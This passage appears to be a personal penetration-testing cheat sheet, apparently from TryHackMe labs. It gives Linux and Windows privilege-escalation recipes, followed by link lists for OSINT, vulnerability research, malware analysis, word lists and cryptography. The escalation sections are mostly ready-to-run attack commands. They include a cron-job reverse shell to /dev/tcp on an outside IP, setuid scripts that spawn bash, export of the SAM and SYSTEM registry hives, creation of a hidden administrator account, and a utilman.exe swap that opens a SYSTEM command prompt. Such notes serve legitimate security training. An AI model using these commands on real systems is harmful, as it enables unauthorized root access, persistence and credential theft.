      3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
         * ``sudo LD_PRELOAD=/home/user/ldpreload/shell.so find``
  * SUID
    * List the files that have SUID or SGID set
      ``find / -type f -perm -04000 -ls 2>/dev/null``
    * ``nano``
    * ``base64``
  * Capabilities
    * ``getcap``
    * List enables capabilities
      ``getcap -r / 2>/dev/null``
  * Cron Jobs
    * ``/etc/crontab``
    * Reverse  Shell
      ``#!/bin/bash``
      ``bash -i &> /dev/tcp/10.10.217.232/1234 0>&1``
    * ``chmod +x target_file``
  * PATH
    * ``echo $PATH``
    * Write a script (`gateway`) that will search for a command (`attack`) from the `PATH

      ```python
      #!/usr/bin/python3
      import os
      import sys

      try: 
              os.system("/bin/bash")
      except:
              sys.exit()
      ```

      Make it executable.
    * Set SUID bit
      ``chmod u+s gateway``
    * If we have write access to any paths mentioned in `PATH`, we create a binary (`attack`) named same as the command

      * attack
        ``echo "/bin/bash" >> attack``
        ``chmod 777 attack``
      * Find writable folders
        ``find / -writable 2>/dev/null``
        ``find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u``
        ``find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u``
      * Add folder to `PATH`
        ``export PATH=/folder_name:$PATH``
    * Now, if we run the script (`gateway`), the script will run the binary (`attack`) with root priviledge.
  * NFS
    * On target machine
      ``cat /etc/exports``
      Find share with ``no_root_squash``
    * Enumerate mountable shares
      ``showmount -e target_ip``
    * Mount one of the `no_root_squash` shares to the attacking machine.
    * Build a executable (`attack.py`)
      ```
      #!/usr/bin/python3
      import os
      import sys

      try: 
              os.system("/bin/bash")
      except:
              sys.exit()
      ```
    * Set SUID bit
      ``chmod +s attack.py``
    * Copy it to the mounted directory
    * Execute it from target machine (shell)
* Windows
  * Print
    `type flag.txt`
  * Create a new user
    `net user username password /add`
  * Add the user to administrator group
    `net localgroup administrators username /add`
  * `schtasks`
    * `schtasks /query /tn task_name /fo list /v`
    * `schtasks /run /tn task_name`
  * `icacls`
    To check file permission of an executable
    * `icacls file_path`
    * `icacls service_name /grant Everyone:F`
  * `sc qc`
    * `BINARY_PATH_NAME`
      Associated Executable
    * `SERVICE_START_NAME`
      Account used to run the executable
    * `sc server_name qc service_name`
    * `sc qc service_name`
    * `sc start service_name`
    * `sc stop service_name`
  * Discretionary Access Control List (DACL)
  * Process Hacker
  * All of the services configurations are stored on the registry under
    `HKLM\SYSTEM\CurrentControlSet\Services\`
  * Permissions
    * `F` (Full Access)
    * `M` (Modify)
    * `RX` (Read-Execute)
    * `I` (Inherit)
  * Insecure Permissions on Service Executables
    * `M` access permission to the executable
  * Unquoted Service Paths
    * `BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`
      * `C:\MyPrograms\Disk.exe`
      * `C:\MyPrograms\Disk Sorter.exe`
      * `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`
    * But we have to have permission to the parent directory
  * Insecure Service Permissions
    * If the service DACL (not the service's executable DACL) allow us to modify the configuration of a service, we will be able to reconfigure the service.
    * To check for a service DACL from the command line, [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)

      * `accesschk64.exe -qlc service_name`
      * `SERVICE_ALL_ACCESS`
        Can reconfigure the service
  * Windows Privileges
    * `whoami /priv`
    * [Priv2Admin](https://github.com/gtworek/Priv2Admin)
    * `SeBackup/SeRestore`
      Allow users to read and write to any file in the system, ignoring any DACL in place.
      * `reg save hklm\system C:\Users\THMBackup\system.hive`
      * `reg save hklm\sam C:\Users\THMBackup\sam.hive`
    * `SeTakeOwnership`
      Allows a user to take ownership of any object on the system.
      * `utilman.exe`
      * `takeown /f C:\Windows\System32\Utilman.exe`
      * `icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F`
      * `copy cmd.exe utilman.exe`
      * Clicking on ease of access button (`utilman`), now we get a `cmd` with system privileges.
    * `SeImpersonate/SeAssignPrimaryToken `
      Allow a process to impersonate other users and act on their behalf.
  * Vulnerable Softwares
    * `wmic`
      * `wmic product get name,version,vendor`
    * Case Studies
      * Druva inSync 6.6.3
  * 

#### OSINT

- [OSINT Framework](https://osintframework.com/)
- [hunter.io](https://hunter.io/)
- [theHarvester](https://github.com/laramies/theHarvester)
- Social
  - [sherlock](https://github.com/sherlock-project/sherlock)
  - [LinkedInt](- https://github.com/vysecurity/LinkedInt -)
  - [gophish](- - https://github.com/gophish/gophish -)
- [Google Dorking](https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06)
  - [Google Advanced Search](https://www.google.com/advanced_search)
  - [Google Hacking Database](https://www.exploit-db.com/google-hacking-database) (GHDB)
- [Wayback Machine](https://archive.org/web/)
- Subdomain Enumeration
  - Certificate Search
    - [https://crt.sh/](https://crt.sh/)
    - [https://ui.ctsearch.entrust.com/ui/ctsearchui](https://ui.ctsearch.entrust.com/ui/ctsearchui)
  - [Sublist3r](https://github.com/aboul3la/Sublist3r)
- Domain Name or IP Related
  - [whois](https://lookup.icann.org/en/lookup)
    - [whois-history](https://research.domaintools.com/research/whois-history/)
  - [dnsrecon](https://www.kali.org/tools/dnsrecon/)
  - [viewdns.info](https://viewdns.info/)
  - [threat-intelligence-platform](https://threatintelligenceplatform.com/)
  - [censys](https://search.censys.io/)
  - [shodan](https://www.shodan.io/)
  - [https://wigle.net/](https://wigle.net/)
- File Related
  - [pdfinfo](https://linux.die.net/man/1/pdfinfo)
  - [exiftool](https://exiftool.org/)
- [recon-ng](https://www.kali.org/tools/recon-ng/)
- [maltego](https://www.kali.org/tools/maltego/)

#### Vulnerability Research

- [https://www.exploit-db.com/](https://www.exploit-db.com/)
- [https://www.exploit-db.com/searchsploit](https://www.exploit-db.com/searchsploit)
- [https://nvd.nist.gov/vuln/search](https://nvd.nist.gov/vuln/search)
- [https://www.rapid7.com/db/](https://www.rapid7.com/db/)
- [https://cve.mitre.org/](https://cve.mitre.org/)
- [https://www.cvedetails.com/](https://www.cvedetails.com/)
- [Zero Logon Vulnerability](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) (Secura Whitepaper)
  - [MS-NRPC: Remote Logon Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ff8f970f-3e37-40f7-bd4b-af7336e4792f)
  - [PoC](https://github.com/SecuraBV/CVE-2020-1472)
- [OpenVAS](https://openvas.org/)
  - `sudo docker run -d -p 443:443 --name openvas mikesplain/openvas`
- 

#### Malware Research

- [malapi.io](https://malapi.io/)
- [Windows API](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
- [Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)
- [https://github.com/PatrikH0lop/malware_showcase](https://github.com/PatrikH0lop/malware_showcase)
- [Yara Rules](https://yara.readthedocs.io/en/stable/writingrules.html)
- Static Malware Analysis

  - [PEStudio](https://www.winitor.com/download)
  - [radare2](https://rada.re/n/)
  - [Binary Ninja](https://binary.ninja/)
  - [IDA Pro](https://hex-rays.com/ida-pro/)
  - [ghidra](https://ghidra-sre.org/)
  - [Cutter](https://cutter.re/)
- Antivirus (AV)

  - [SharpEDRChecker](https://github.com/PwnDexter/SharpEDRChecker)
  - Open Source
    - [ClamAV](https://www.clamav.net/)
  - [AntiscanMe](https://antiscan.me/)
  - [Jotti](https://virusscan.jotti.org/)
- [Malware Traffic Analysis](https://www.malware-traffic-analysis.net/)
- [MalwareBazaar](https://bazaar.abuse.ch/)
- [MalShare](https://malshare.com/)
- Fuzzy Hashing
  (Similarity Preserving Hash Functions or SPHF)

  - [SSDEEP](https://ssdeep-project.github.io/ssdeep/index.html)
- [MISP](https://www.misp-project.org/) (Malware Information Sharing Platform)
- Remote Access Trojan (RAT)
- [abuse.ch](Abuse.ch)

  - [MalwareBazaar](https://bazaar.abuse.ch/)
  - [Feodo Tracker](https://feodotracker.abuse.ch/)
  - [SSL Blacklist](https://sslbl.abuse.ch/)
  - [URL Haus](https://urlhaus.abuse.ch/)
  - [Threat Fox](https://threatfox.abuse.ch/)
- Identify the compile/packer of a file

  - [PeID](https://softfamous.com/peid/)
- Just because a file doesn't have the `.exe` extension, doesn't mean it isn't an actual executable! It can have the `.jpg` extension and still be an executable piece of code. Depends on `file signatures`.
- If a file isn't obfuscated/packed, it should have a larger import count and more complex codeflow graph, viewed on disassmbler.
- [PE Explorer](http://www.pe-explorer.com/)
- [IDA Free](https://hex-rays.com/ida-free/)
- [REMnux](https://remnux.org/)

  - `vmonkey`
    ViperMonkey is a parser engine that is capable of analysing visual basic macros without executing (opening the document).
- Malicious PDFs

  - Can include

    - Javascript
    - Python
    - Executables
    - Powershell Shellcode
  - [peepdf](https://pypi.org/project/peepdf/0.3.2/)

    - `peepdf demo_notsuspicious.pdf`
    - `echo 'extract js > javascript-from-demo_notsuspicious.pdf' > extracted_javascript.txt`
    - `peepdf -s extracted_javascript.txt demo_notsuspicious.pdf`
- [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html)

  - `readelf -l file_name`
- File Entropy

  - A rating that scores (0-8.0) how random the data within a PE file is.
  - Encrypted/packed file will have high entropy score.
  - Packers change the entry point from the original location to what's called the "Unpacking Stub". Once the program is fully unpacked, the entry point will now relocate back to its normal place to begin executing code.
  - Packed files will have very few "Imports". (May only have "GetProcAddress" and "LoadLibrary")
  - They may have sections named after certain packers such as UPX.
- 

#### Hardware Tools

- USB Rubber Ducky Using Rasberry Pi Pico
  https://github.com/dbisu/pico-ducky
- FemtoCell
- Stingray

#### Word Lists

- [RockYou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- [SecLists](https://github.com/danielmiessler/SecLists)
  - [directory-list-1.0.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/directory-list-1.0.txt)
- [jwt-secrets](https://github.com/wallarm/jwt-secrets)

#### Cryptography

* [Chinese Remainder Theorem](https://en.wikipedia.org/wiki/Chinese_remainder_theorem)
* [Hastad Broadcast Attack](https://en.wikipedia.org/wiki/Coppersmith%27s_attack#H%C3%A5stad's_broadcast_attack)
  * [https://crypto.stackexchange.com/a/52519/106329](https://crypto.stackexchange.com/a/52519/106329)
  * [https://asecuritysite.com/ctf/rsa_ctf02](https://asecuritysite.com/ctf/rsa_ctf02)
  * [https://docs.xanhacks.xyz/crypto/rsa/08-hastad-broadcast-attack/](https://docs.xanhacks.xyz/crypto/rsa/08-hastad-broadcast-attack/)
*
